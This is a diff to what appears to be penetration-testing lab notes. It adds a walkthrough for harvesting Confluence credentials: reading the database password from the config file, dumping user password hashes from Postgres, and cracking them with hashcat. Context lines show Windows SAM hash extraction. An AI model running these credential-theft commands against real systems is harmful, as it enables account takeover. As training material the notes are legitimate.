@@ -126,6 +126,59 @@ chmod 600 id_rsa
 ssh -i id_rsa -p 22 ser@192.168.180.201
 ```
 
+## Confluence Key Cracking
+
+Scenario
+
+* Attacker has access to Confluence Server and found credential
+* Connect to Postgres
+* Use \l to list all databases
+* Use \c database to Connect to database
+* Get Attlasian credentials from cwd_user
+* Use hydra to crack the PKCS5S2 hash
+
+Victim
+
+```bash
+# Search Confluence config for SQL password
+cat /var/atlassian/application-data/confluence/confluence.cfg.xml
+ 
+<property name="hibernate.connection.password">S3cretPassw0rd</property>
+<property name="hibernate.connection.url">jdbc:postgresql://10.4.187.215:5432/confluence</property>
+<property name="hibernate.connection.username">postgres</property>
+```
+
+```bash
+# Get Attassion credential from cwd_user
+psql -h 192.168.187.63 -p 2345 -U postgres
+\l
+\c confluence
+select * from cwd_user;
+select user_name, credential from cwd_user;
+
+
+   user_name    |                                credential
+----------------+---------------------------------------------------------------------------
+ admin          | {PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA
+ trouble        | {PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342
+ happiness      | {PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc
+ hr_admin       | {PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R
+ database_admin | {PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv
+ rdp_admin      | {PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP
+```
+
+Attacker
+
+```bash
+hashcat --help | grep -i "Atlassian"
+  12001 | Atlassian (PBKDF2-HMAC-SHA1)                               | Framework
+  
+hashcat -m 12001 /tmp/hashes.txt /usr/share/wordlists/fasttrack.txt
+
+{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R:Welcome1234
+{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
+```
+
 ## NTLM Cracking
 
 * **Limitation**: Require privileges `SeDebugPrivilege` or `Administrator`
@@ -152,7 +205,7 @@ lsadump::sam
 ```
 
 ```powershell
-# Extracting NTLM hashes, requires SeImpersonatePrivilege
+# Extracting NTLM hashes, requires SeImpersonatePrivilege or 
 reg save HKLM\sam sam
 reg save HKLM\system system
 ```
